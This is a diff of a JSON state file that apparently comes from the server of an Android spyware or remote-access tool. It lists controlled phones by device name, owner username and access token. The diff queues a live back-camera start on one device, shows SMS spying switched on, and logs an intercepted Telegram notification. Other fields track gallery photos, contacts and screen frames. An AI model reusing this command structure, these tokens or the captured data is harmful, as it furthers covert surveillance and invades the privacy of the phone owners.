@@ -4,7 +4,7 @@
     "deviceName": "HP-TES123-74EC",
     "ownerUsername": "BLAY VIP",
     "token": "55a5b4006ca55171a079b79bc615ba6c",
-    "lastSeen": 1775458651152,
+    "lastSeen": 1775458681154,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-06T06:50:16.345Z",
@@ -2507,8 +2507,16 @@
     "deviceName": "HP-RISKI_123-D73B",
     "ownerUsername": "Riski",
     "token": "edadccccbb547c8d8cc05f1fd51950e5",
-    "lastSeen": 1775458651221,
-    "commandQueue": [],
+    "lastSeen": 1775458681408,
+    "commandQueue": [
+      {
+        "type": "camera_live_start",
+        "payload": {
+          "facing": "back"
+        },
+        "sentAt": 1775458680446
+      }
+    ],
     "online": true,
     "connectedAt": "2026-04-06T06:52:49.760Z",
     "deviceInfo": {
@@ -2522,7 +2530,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "XTERCLOSE・8948 pesan baru dari 92 obrolan",
+        "time": "06/04 13:57",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458680738
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
